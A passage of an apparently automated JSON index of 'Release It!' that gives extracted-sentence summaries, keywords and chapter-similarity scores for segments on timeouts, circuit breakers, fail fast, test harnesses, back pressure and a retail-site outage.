          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.576,
          "base_score": 0.576,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.572,
          "base_score": 0.572,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "nodes",
          "slow responses",
          "nodes service",
          "slow",
          "responses"
        ],
        "semantic": [],
        "merged": [
          "nodes",
          "slow responses",
          "nodes service",
          "slow",
          "responses"
        ]
      },
      "topic_id": 2,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.3850426700840815,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246070+00:00"
      }
    },
    {
      "chapter_number": 13,
      "title": "Segment 13 (pages 99-106)",
      "start_page": 99,
      "end_page": 106,
      "summary": "Calling into native code makes the JVM just as crashy as any C program.) Type 2 drivers use a thin layer of Java to call out to the database vendor’s native API library.\nThe last query I saw was just hitting a message table that the server used for its database- backed implementation of JMS.\nBecause the app server was written to just select all the rows from the table, each instance would try to receive all ten-million-plus messages.\nThis put a lock on the rows, since the app server issued a “select for update” query.\nThis failure mode can occur when querying databases or calling services.\nAn incomplete solution (but better than nothing) would be to query for the full results but break out of the processing loop after reaching the maximum number of rows.\nAlthough this does provide some added stability on the application server, it does so at the expense of wasted database capacity.\nYou need production-sized data sets to see what happens when your query returns a million rows that you turn into objects.\nIt’s time to talk about the stability patterns you can apply to protect your software.\nTimeouts\nWhen that happens, your code can’t just wait forever for a response that might never come; sooner or later, it needs to give up.\nSec- ond, the networking code was absolutely riddled with error handling for dif- ferent flavors of timeouts.\nWell-placed timeouts provide fault isolation—a problem in some other service or device does not have to become your problem.\nIndeed, some high-level APIs have few or no explicit timeout settings.\nMany APIs offer both a call with a timeout and a simpler, easier call that blocks forever.\nCommercial software client libraries are notoriously devoid of timeouts.\nBy hiding the socket from your code, they also prevent you from setting vital timeouts.\nTimeouts can also be relevant within a single service.\nIt’s essential that any resource pool that blocks threads must have a timeout to ensure that calling threads eventually unblock, whether resources become available or not.\nAlways use the form that takes a timeout argument.\nAn approach to dealing with pervasive timeouts is to organize long-running operations into a set of primitives that you can reuse in many places.\nFor example, suppose you need to check out a database connection from a resource pool, run a query, turn the result set into objects, and then check the database connection back into the pool.\nInstead of coding that sequence of interactions dozens of places, with all the associated handling of timeouts (not to mention other kinds\nTimeouts • 93\nYou may think, as I did when porting the sockets library, that handling all the possible timeouts creates undue complexity in your code.\nof errors), create a query object (see Patterns of Enterprise Application Architecture [Fow03]) to represent the part of the interaction that changes.\nUse a generic gateway to provide the template for connection handling, error handling, query execution, and result processing.\nLanguage runtimes that use callbacks or reactive programming styles also let you specify timeouts more easily.\nTimeouts are often found in the company of retries.\nIf the operation failed because of any significant problem, it’s likely to fail again if retried immediately.\nIf you cannot complete an operation because of some timeout, it is better for you to return a result.\nMaking me wait while you retry the operation might push your response time past my timeout.\nThe Timeouts pattern and the Fail Fast pattern (which I discus in Fail Fast, on page 106) both address latency problems.\nThe Timeouts pattern is useful when you need to protect your system from someone else’s failure.\nFail Fast applies to incoming requests, whereas the Timeouts pattern applies primarily to outbound requests.\nTimeouts can also help with unbounded result sets by preventing the client from processing the entire result set, but they aren’t the most effective approach to that particular problem.\nTimeouts apply to a general class of problems.\nApply Timeouts to Integration Points, Blocked Threads, and Slow Responses.\nThe Timeouts pattern prevents calls to Integration Points from becoming Blocked Threads.\nThus, timeouts avert Cascading Failures.\nApply Timeouts to recover from unexpected failures.\nThe Timeouts pattern lets us do that.\nMost of the explanations for a timeout involve problems in the network or the remote system that won’t be resolved right away.",
      "keywords": [
        "Timeouts",
        "Timeouts pattern",
        "system",
        "Unbounded Result Sets",
        "Result Sets",
        "Result",
        "server",
        "n’t",
        "patterns",
        "code",
        "query",
        "report erratum",
        "stability patterns",
        "Unbounded Result",
        "fast"
      ],
      "concepts": [
        "queries",
        "query",
        "server",
        "patterns",
        "failure",
        "api",
        "apis",
        "code",
        "coding",
        "data"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 10,
          "title": "",
          "score": 0.598,
          "base_score": 0.448,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.567,
          "base_score": 0.417,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.545,
          "base_score": 0.395,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 17,
          "title": "",
          "score": 0.531,
          "base_score": 0.381,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 23,
          "title": "",
          "score": 0.496,
          "base_score": 0.346,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "timeouts",
          "timeouts pattern",
          "result",
          "query",
          "timeout"
        ],
        "semantic": [],
        "merged": [
          "timeouts",
          "timeouts pattern",
          "result",
          "query",
          "timeout"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.26135823537479647,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246108+00:00"
      }
    },
    {
      "chapter_number": 14,
      "title": "Segment 14 (pages 107-114)",
      "start_page": 107,
      "end_page": 114,
      "summary": "Circuit Breaker • 95\nCircuit Breaker\nNow, circuit breakers protect overeager gadget hounds from burning their houses down.\nMore abstractly, the circuit breaker exists to allow one subsystem (an electrical circuit) to fail (excessive current draw, possibly from a short circuit) without destroying the entire system (the house).\nFurthermore, once the danger has passed, the circuit breaker can be reset to restore full function to the system.\nThis differs from retries, in that circuit breakers exist to prevent operations rather than reexecute them.\nIn the normal “closed” state, the circuit breaker executes operations as usual.\nThese can be calls out to another system, or they can be internal operations that are subject to timeout or other execution failure.\nIf it fails, however, the circuit breaker makes\nOnce the number of failures (or the frequency of failures, in more sophisticated cases) exceeds a threshold, the circuit breaker trips and “opens” the circuit, as shown in the following figure.\nWhen the circuit is “open,” calls to the circuit breaker fail immediately, without any attempt to execute the real operation.\nAfter a suitable amount of time, the circuit breaker decides that the operation has a chance of suc- ceeding, so it goes into the “half-open” state.\nIn this state, the next call to the circuit breaker is allowed to execute the dangerous operation.\nShould the call succeed, the circuit breaker resets and returns to the “closed” state, ready for more routine operation.\nIf this trial call fails, however, the circuit breaker returns to the open state until another timeout elapses.\nDepending on the details of the system, the circuit breaker may track different types of failures separately.\nWhen the circuit breaker is open, something has to be done with the calls that come in.\nA circuit breaker may also have a “fallback” strategy.\nCircuit Breaker • 97\nCircuit breakers are a way to automatically degrade functionality when the system is under stress.\nTherefore, it’s essential to involve the system’s stakeholders when deciding how to handle calls made when the circuit is open.\nOf course, this conversation is not unique to the use of a circuit breaker, but discussing the circuit breaker can be a more effective way of broaching the topic than asking for a requirements document.\nThe state of the circuit breakers in a system is important to another set of stakeholders: operations.\nChanges in a circuit breaker’s state should always be logged, and the current state should be exposed for querying and monitor- ing.\nIn fact, the frequency of state changes is a useful metric to chart over time; it is a leading indicator of problems elsewhere in the enterprise.\nLikewise, Operations needs some way to directly trip or reset the circuit breaker.\nThe circuit breaker is also a convenient place to gather metrics about call volumes and response times.\nA circuit breaker should be built at the scope of a single process.\nThat is, the same circuit breaker state affects every thread in a process but is not shared across multiple processes.\nHowever, sharing the circuit breaker state introduces another out- of-process communication.\nEven when just shared within a process, circuit breakers are subject to the gallery of multithreaded programming terrors.\nOpen source circuit breaker libraries are available for every language and framework, so it’s probably better to start with one of those.\nCircuit breakers are effective at guarding against integration points, cascading failures, unbalanced capacities, and slow responses.\nCircuit Breaker is the fundamental pattern for protecting your system from all manner of Integration Points problems.\nCircuit Breaker is good at avoiding calls when Integration Points has a problem.\nPopping a Circuit Breaker always indicates something abnormal.\nAt the largest scale, a mission-critical service might be implemented as sev- eral independent farms of servers, with certain farms reserved for use by critical applications and others available for noncritical uses.\nIn the figure that follows, Foo and Bar both use the enterprise service Baz. Because both depend on a common service, each system has some vulnera- bility to the other.\nAt smaller scales, process binding is an example of partitioning via bulkheads.\nYou can partition the threads inside a single process, with separate thread groups dedicated to different functions.\nThe Bulkheads pattern partitions capacity to preserve partial functional- ity when bad things happen.\nFiddling is often followed by the “ohnosecond”—that very short moment in time during which you realize that you have pressed the wrong key and brought down a server, deleted vital data, or otherwise damaged the peace and harmony of stable operations.\nWhen this bucket overflows, bad things happen: servers go down, databases get slow or throw errors, response times head for the stars.",
      "keywords": [
        "Circuit Breaker",
        "Circuit",
        "circuit breaker state",
        "Breaker",
        "system",
        "circuit breaker fail",
        "circuit breaker resets",
        "circuit breaker trips",
        "circuit breaker returns",
        "circuit breaker makes",
        "circuit breaker executes",
        "state",
        "circuit breaker exists",
        "Foo Bar Baz",
        "breaker state"
      ],
      "concepts": [
        "patterns",
        "service",
        "breaker",
        "states",
        "operation",
        "operations",
        "operating",
        "bulkheads",
        "useful",
        "uses"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.569,
          "base_score": 0.419,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.554,
          "base_score": 0.404,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 4,
          "title": "",
          "score": 0.461,
          "base_score": 0.311,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.385,
          "base_score": 0.235,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 2,
          "title": "",
          "score": 0.373,
          "base_score": 0.223,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "circuit",
          "breaker",
          "circuit breaker",
          "state",
          "breaker state"
        ],
        "semantic": [],
        "merged": [
          "circuit",
          "breaker",
          "circuit breaker",
          "state",
          "breaker state"
        ]
      },
      "topic_id": 2,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2054783324161512,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246140+00:00"
      }
    },
    {
      "chapter_number": 15,
      "title": "Segment 15 (pages 115-122)",
      "start_page": 115,
      "end_page": 122,
      "summary": "Log Files\nOne log file is like one pile of cow dung—not very valuable, and you’d rather not dig through it.\nCollect tons of cow dung and it becomes “fertilizer.” Like- wise, if you collect enough log files you can discover value.\nLeft unchecked, however, log files on individual machines are a risk.\nWhen log files grow without bound, they’ll eventually fill up their containing filesystem.\nWhether that’s a volume set aside for logs, the root disk, or the application installation directory (I hope not), it means trouble.\nWhen log files fill up the filesystem, they jeopardize stability.\nThat means an application will start getting I/O errors when the filesystem is 90 or 95 percent full.\nIn the best-case scenario, the logging filesystem is separate from any critical data storage (such as transactions), and the application code protects itself well enough that users never realize anything is amiss.\nAs soon as the filesystem got full, this poor exception handler went nuts, trying to log an ever-increasing stack of exceptions.\nBecause there were multiple threads, each trying to log its own Sisyphean exception, this application server was able to consume eight entire CPUs—for a little while, anyway.\nLog file rotation requires just a few minutes of configuration.\nMake sure that all log files will get rotated out and eventually purged, though, or you’ll eventually spend time fixing the tool that’s supposed to help you fix the system.\nDon’t We Have to Keep All Our Log Files Forever?\nIndividual machines can’t possibly retain logs that long.\nThe best thing to do is get logs off of production machines as quickly as possible.\nLog files on production systems have a terrible signal-to-noise ratio.\nShip the log files to a centralized logging server, such as Logstash, where they can be indexed, searched, and monitored.\nBetween data in the database and log files on the disk, persistent data can find plenty of ways to clog up your system.\nImproper use of caching is the major cause of memory leaks, which in turn lead to horrors like daily server restarts.\nNothing gets administrators in the habit of being logged onto production like daily (or nightly) chores.\nSteady State also encourages better operational discipline by limiting the need for system administrators to log on to the production servers.\nDBAs can create scripts to purge data, but they don’t always know how the application behaves when data is removed.\nMaintaining logical integrity, especially if you use an ORM tool, requires the application to purge its own data.\nDon’t keep an unlimited amount of log files.\nConfigure log file rotation based on size.\nThe application or service can tell from the incoming request or message roughly what database connections and external integration points will be needed.\nThe service can quickly check out the connections it will need and verify the state of the circuit breakers around the integration points.\nIf any of the resources are not available, the service can fail immediately, rather than getting partway through the work.\nAnother way to fail fast in a web application is to perform basic parameter- checking in the servlet or controller that receives the request, before talking to the database.\nWhen my team started on the rendering software, we applied the Fail Fast pattern.\nThe renderer reported any such failure to the job control system immediately, before it wasted several minutes of compute time.\nSure enough, the one place we broke the Fail Fast principle was the one place our renderer failed to report errors before wasting effort.\nEven when failing fast, be sure to report a system failure (resources not available) differently than an application failure (parameter violations or invalid state).\nReporting a generic “error” message may cause an upstream system to trip a circuit breaker just because some user entered bad data and hit Reload three or four times.\nThe Fail Fast pattern improves overall system stability by avoiding slow responses.\nIf critical resources aren’t available —for example, a popped Circuit Breaker on a required callout—then don’t waste work by getting to that point.\nThat means getting the system back into a known good state using things like exception handlers to fix the execution stack and try-finally blocks or block-scoped resources to clean up memory leaks.\nIf you follow the library’s rules for resource management and state isolation, you can still get the benefits of “let it crash.” You should plan on more code reviews to make sure every developer follows those rules, though!\nWith in-process components like actors, the restart time is measured in microseconds.\nWhen we crash an actor or a process, how does a new one get started?\nActor systems use a hierarchical tree of supervisors to manage the restarts.\nThe supervisor can then decide to restart the child actor, restart all of its children, or crash itself.\nSupervisors need to keep close track of how often they restart child processes.\nIt may be necessary for the supervisor to crash itself if child restarts happen too densely.\nThey will always restart the crashed instance, even if it is just going to crash again immediately.\nAfter an actor or instance crashes and the supervisor restarts it, the system must resume calling the newly restored provider.\nWith statically allocated virtual machines in a data center, the instance should be reintegrated when health checks from the load balancer begin to pass.",
      "keywords": [
        "log files",
        "Fail Fast",
        "system",
        "log",
        "Fail Fast pattern",
        "n’t",
        "crash",
        "State",
        "files",
        "application",
        "data",
        "Fail",
        "Fast",
        "report erratum",
        "time"
      ],
      "concepts": [
        "data",
        "state",
        "log",
        "logs",
        "logging",
        "caching",
        "cache",
        "requires",
        "requirement",
        "server"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 22,
          "title": "",
          "score": 0.714,
          "base_score": 0.564,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 29,
          "title": "",
          "score": 0.624,
          "base_score": 0.474,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 4,
          "title": "",
          "score": 0.461,
          "base_score": 0.461,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.381,
          "base_score": 0.381,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.355,
          "base_score": 0.355,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "log",
          "log files",
          "files",
          "fail fast",
          "fast"
        ],
        "semantic": [],
        "merged": [
          "log",
          "log files",
          "files",
          "fail fast",
          "fast"
        ]
      },
      "topic_id": 4,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.24063749173498897,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246175+00:00"
      }
    },
    {
      "chapter_number": 16,
      "title": "Segment 16 (pages 123-130)",
      "start_page": 123,
      "end_page": 130,
      "summary": "Test Harnesses • 113\nTest Harnesses\n(Naturally, the proof itself is left as an exercise for the reader.) Furthermore, the interdependencies of today’s systems create such an interlocking web of systems that an integration testing environment really becomes unitary—one global integration test that duplicates the real production systems of the entire enterprise.\nIntegration test environments can verify only what the system does when its dependencies are working correctly.\nThe main theme of this book, however, is that every system will eventually end up operating outside of spec; therefore, it’s vital to test the local system’s behavior when the remote system goes wonky.\nfailures that can occur naturally in production, there will be behaviors that integration testing does not verify.\nA better approach to integration testing would allow you to test most or all of these failure modes.\nIt should preserve or enhance system isolation to avoid the version-locking problem and allow testing in many locations instead of the unitary enterprise-wide integration testing environment I described earlier on page 113.\nTo do that, you can create test harnesses to emulate the remote system on the other end of each integration point.\nHardware and mechanical engineers have used test harnesses for a long time.\nSoftware engineers have used test harnesses, but not as maliciously as they should.\nA good test harness should be devious.\nThe test harness should leave scars on the system under test.\nThe real implemen- tation of DataGateway would deal with connection parameters, a database server, and a bunch of test data.\nA mock object improves the isolation of a unit test by cutting off all the external connections.\nA test harness differs from mock objects in that a mock object can only be trained to produce behavior that conforms to the defined interface.\nA test harness runs as a separate server, so it’s not obliged to conform to any interface.\nIf all low-level errors were guaranteed to be recognized, caught, and thrown as the right type of exception, we would not need test harnesses.\nConsider building a test harness that substitutes for the remote end of every web services call.\nTest Harnesses • 115\nIntegration testing environments are good at examining failures only in the seventh layer—the application layer—and not even all of those.\nA test harness “knows” that it’s meant for testing; it has no other role to play.\nAlthough the real application wouldn’t be written to call the low-level network APIs directly, the test harness can be.\nThe test harness should act like a little hacker, trying all kinds of bad behavior to break callers.\nFor example, refusing connections, connecting slowly, and accepting requests without reply would apply to any socket protocol: HTTP, RMI, or RPC.\nFor these, a single test harness can simulate many types of bad network behavior.\nThat way, I don’t need to change modes on the test harness and a single test harness can break many applications.\nIt can even help with functional testing in the development environment by letting multiple developers hit the test harness from their workstations.\n(Of course, it’s also worthwhile to let the developers run their own instances of the killer test harness.)\nBear in mind that your test harness might be really, really good at breaking, even killing applications.\nIt’s not a bad idea to have the test harness log requests, in case your application dies without so much as a whimper to indicate what killed it.\nA test harness that injects faults will unearth many hidden dependencies.\nThe test harness can be designed like an application server; it can have pluggable behavior for the tests that are related to the real application.\nA single framework for the test harness can be subclassed to implement any application-level protocol, or any perversion of the application-level protocol, necessary.\nBroadly speaking, a test harness leads toward “chaos engineering,” which we explore in Chapter 17, Chaos Engineering, on page 325.\nCalling real applications lets you test only those errors that the real application can deliberately produce.\nA good test harness lets you simulate all sorts of messy, real-world failure modes.\nThe test harness can produce slow responses, no responses, or garbage responses.\nYou don’t necessarily need a separate test harness for each integration point.\nThe Test Harness pattern augments other testing methods.\nA test harness helps verify “nonfunctional” behavior while maintaining isolation from the remote systems.\nLess tightly coupled forms of middleware allow the calling and receiving sys- tems to process messages in different places and at different times.",
      "keywords": [
        "test harness",
        "Test Harnesses",
        "system",
        "harness",
        "Handshaking",
        "good test harness",
        "remote system",
        "server",
        "remote",
        "single test harness",
        "Middleware",
        "application",
        "Test Harness pattern",
        "integration testing",
        "protocols"
      ],
      "concepts": [
        "protocols",
        "applications",
        "application",
        "failure",
        "different",
        "differs",
        "middleware",
        "handshaking",
        "handshake",
        "server"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 2,
          "title": "",
          "score": 0.474,
          "base_score": 0.474,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.438,
          "base_score": 0.438,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.396,
          "base_score": 0.396,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.373,
          "base_score": 0.373,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 35,
          "title": "",
          "score": 0.373,
          "base_score": 0.373,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "harness",
          "test harness",
          "test",
          "test harnesses",
          "harnesses"
        ],
        "semantic": [],
        "merged": [
          "harness",
          "test harness",
          "test",
          "test harnesses",
          "harnesses"
        ]
      },
      "topic_id": null,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.26351766718187486,
        "topic_boost": 0.0,
        "timestamp": "2025-12-17T23:08:39.246216+00:00"
      }
    },
    {
      "chapter_number": 17,
      "title": "Segment 17 (pages 131-138)",
      "start_page": 131,
      "end_page": 138,
      "summary": "Other stability patterns can be implemented without large-scale changes to the design or architecture.\nThe more fully you decouple individual servers, layers, and applications, the fewer problems you will observe with Integration Points, Cascading Failures, Slow Responses, and Blocked Threads.\nNo matter how strong your load balancers or how fast you can scale, the world can always make more load than you can handle.\nWhen load gets too high, start to refuse new requests for work.\nWhen requests take longer than the SLA, it’s time to shed some load.\nInside the boundaries of a system or enterprise, it’s more efficient to use back pressure (see Create Back Pressure, on page 120) to create a balanced throughput of requests across synchronously coupled services.\nAvoid slow responses using Shed Load.\nCreating slow responses is being a bad citizen.\nKeep your response times under control rather than getting so slow that callers time out.\nCreate Back Pressure\nAs the queue grows, the time it takes for a piece of work to get all the way through it grows\nCreate Back Pressure • 121\n(See Little’s law.3) So as a queue’s length reaches toward infinity, response time also heads toward infinity.\nWe really don’t want unbounded queues in our systems.\nOn the other hand, if the queue is bounded, we have to decide what to do when it’s full and a producer tries to stuff one more thing into it.\nActually accept the new item and drop something else from the queue on\nBlock the producer until there is room in the queue.\nFor data whose value decreases rapidly with age, dropping the oldest item in the queue might be the best option.\nIt allows the queue to apply “back pressure” upstream.\nPresumably that back pressure propagates all the way to the ultimate client, who will be throttled down in speed until the queue releases.\nTCP uses extra fields in each packet to create back pressure.\nBack pressure from the TCP window can cause the sender to fill up its transmit buffers, in which case subsequent calls to write to the socket will block.\nObviously back pressure can lead to blocked threads.\nThe Back Pressure pattern works best with asynchronous calls and programming.\nBack pressure only helps manage load when the pool of consumers is finite.\nInstead, we can create back pressure by use of a blocking queue for “create tag” calls.\nLet’s say each API server is allowed 100 simultaneous calls to the storage engine.\nWhen the 101st call arrives at the API server, the calling thread blocks until there is an open slot in the queue.\nThat blocking is the back pressure.\nThe API server cannot make calls any faster than it is allowed.\nIt means that one API server may have blocked threads while another has free slots available.\nWe could make this smarter by letting the API servers make as many calls as they want but put the blocking on the receiver’s end.\nIn that case, our off- the-shelf storage engine must be wrapped with a service to receive calls, measure response times, and adjust its internal queue size to maximize throughput and protect the engine.\nIn our example, the API server should accept calls on one thread pool and then issue the outbound call to storage on another set of threads.\nThat way, when the outbound call blocks, the request-handling thread can time out, unblock, and respond with an HTTP 503.\nA consumer inside your system boundary will experience back pressure as a performance problem or as timeouts.\nBack Pressure creates safety by slowing down consumers.\nQueues must be finite for response times to be finite.\nYou only have a few options when a queue is full.\nWe should use automation for things humans are bad at: repetitive tasks and fast response.\nWe can create governors to slow the rate of actions.\nThe whole point of a governor is to slow things down enough for humans to get involved.\nAutomation will make them go fast, so you should apply a Governor to provide humans with time to intervene.",
      "keywords": [
        "back pressure",
        "Create Back Pressure",
        "back",
        "queue",
        "pressure",
        "Load",
        "Create Back",
        "API server",
        "Back Pressure pattern",
        "API",
        "Shed Load",
        "Create",
        "Slow",
        "calls",
        "Blocked Threads"
      ],
      "concepts": [
        "queue",
        "calls",
        "blocked",
        "load",
        "pattern",
        "create",
        "creating",
        "human",
        "start",
        "responsible"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.845,
          "base_score": 0.695,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 23,
          "title": "",
          "score": 0.695,
          "base_score": 0.545,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 11,
          "title": "",
          "score": 0.674,
          "base_score": 0.524,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 10,
          "title": "",
          "score": 0.652,
          "base_score": 0.502,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.637,
          "base_score": 0.487,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "pressure",
          "queue",
          "api server",
          "create pressure",
          "create"
        ],
        "semantic": [],
        "merged": [
          "pressure",
          "queue",
          "api server",
          "create pressure",
          "create"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.31122620304675325,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246255+00:00"
      }
    },
    {
      "chapter_number": 18,
      "title": "Segment 18 (pages 139-146)",
      "start_page": 139,
      "end_page": 146,
      "summary": "After a few hundred years, the official calendar date for the solstice would occur weeks before the actual event.\nOver a 400-year cycle, the calendar dates vary by as much as 2.25 days, but they vary predictably and periodically; overall, the error is cyclic, not cumulative.\nThe Gregorian calendar, like most calendars, was created to mark holy days (that is, holidays).\nThese landmarks happen to be marked with specific dates on the Gregorian calendar, but in the minds of florists and their entire extended supply chain, those seasons have their own significance beyond the official calendar date.\nFor retailers, the year begins and ends with the euphemistically named “holiday season.” Here we see a correspondence between various religious calendars and the retail calendar.\nBy long tradition, this is when consumers start getting serious about gift shopping, because there are usu- ally a little less than 30 days left in the season at that point.\nThe weeks and months following launch proved, time and time again, why launching a new site is like having a baby.\nWhy would they parse content during page rendering?”) Still, for all the problems we experienced following the launch, we approached the holiday season with cautious optimism.\nThe spikes were large enough to see where page latency started to climb, so we had a good feel for what level of load would cause the site to bog down.\nBetween the inherent capabilities of the application server and the tools we had built around the application server, we had more visibil- ity and control over the online store internals than any other system on which I’ve worked.\nBear in mind, we were the local engineering team; the main site operations center (SOC)—a facility staffed with highly skilled engineers twenty-four hours a day—was in another city.\nOur local team was far too small to be on-site twenty-four hours a day all the time, but we worked out a way to do it for the limited span of the Thanksgiving weekend.\nDuring the run-up to the launch, I was part of load testing this new site.\nTo get more information out of the load test, I had started off using the application server’s HTML administration GUI to check vitals like latency, free heap memory, active request-handling threads, and active sessions.\nOn the other hand, if you need to look at thirty or forty servers at a time, the GUI gets downright impractical.\nBecause the entire admin GUI was HTML-based, the application server never knew the difference between a Perl module or a web browser.\nArmed with these Perl modules, I was able to create a set of scripts that would sample all the application servers for their vital stats, print out detail and summary results, sleep a while, and loop.\nThey were simple indicators, but in the time since site launch, all of us had learned the normal rhythm and pulse of the site by watching these stats.\nThe session count in the early morning already rivaled peak time of the busiest day in a normal week.\nPage latency, our summary indicator of response time and overall site performance, was clearly stressed but still nominal.\nBy evening, we had taken as many orders in one day as in the entire month to date.\nThis is Daniel from the site operations center,” said Daniel.\nIn an ATG site,1 page requests are handled by instances that do nothing but serve pages.\nThe web server calls the applica- tion server via the Dynamo Request Protocol (DRP), so it’s common to refer to the request- handling instances as DRPs. A red DRP indi- cates that one of those request-handling instances stopped responding to page requests.\n“All DRPs red” meant the site was down, losing orders at a rate of about a million dollars an hour.\nIt takes about ten minutes to bring up all the application servers on a single host.\nThere’s nothing like trying to sort out fifteen different voices in an echoing conference room, especially when other people keep popping in and out of the call from their desks, announcing such helpful information as, “There’s a problem with the site.” Yes, we know.\nApplication server page latency (response time) was high.\nRequest-handling threads were almost all busy.\nYou can only measure the response time on requests that are done.\nOther than the long response time, which we already knew about since SiteScope was failing to complete its synthetic transactions, none of our usual suspects looked guilty.\nTo get more information, I started taking thread dumps of the application servers that were misbehaving.\nWhile I was doing that, I asked Ashok, one of our rock- star engineers who was on-site in the conference room, to check the back- end order management system.\nHe saw similar patterns on the back end as on the front end: low CPU usage and most threads busy for a long time.\nIt was now almost an hour since I got the call, or ninety minutes since the site went down.\nThe thread dumps on the front-end application servers revealed a similar pattern across all the DRPs. A few threads were busy making a call to the back end, and most of the others were waiting for an available connection to call the back end.\nIn short, every single request- handling thread, all 3,000 of them, were tied up doing nothing, perfectly explaining our observation of low CPU usage: all 100 DRPs were idle, waiting forever for an answer that would never come.\nThread dumps on that system revealed that some of its 450 threads were occupied making calls to an external integration point, as shown in the following figure.\nHe explained that of the four servers that normally handle scheduling, two were down for maintenance over the holiday weekend and one of the others was malfunctioning for reasons unknown.\nThe sole scheduling server that remained could handle up to twenty-five concurrent requests before it started to slow down and hang.\nSure enough, when the on-call engineer checked the lone scheduling server, it was stuck at 100 percent CPU.\nHe had gotten paged a few times about the high CPU condition but had not responded, since that group routinely gets paged for transient spikes in CPU usage that turn out to be false alarms.",
      "keywords": [
        "Aloysius Lilius invented",
        "Gregorian calendar",
        "Phenomenal Cosmic Powers",
        "calendar",
        "Julian calendar",
        "named Aloysius Lilius",
        "doctor named Aloysius",
        "Calabrian doctor named",
        "Itty-Bitty Living Space",
        "threads",
        "time",
        "application server",
        "official calendar date",
        "Aloysius Lilius",
        "Calabrian doctor"
      ],
      "concepts": [
        "site",
        "calendar",
        "request",
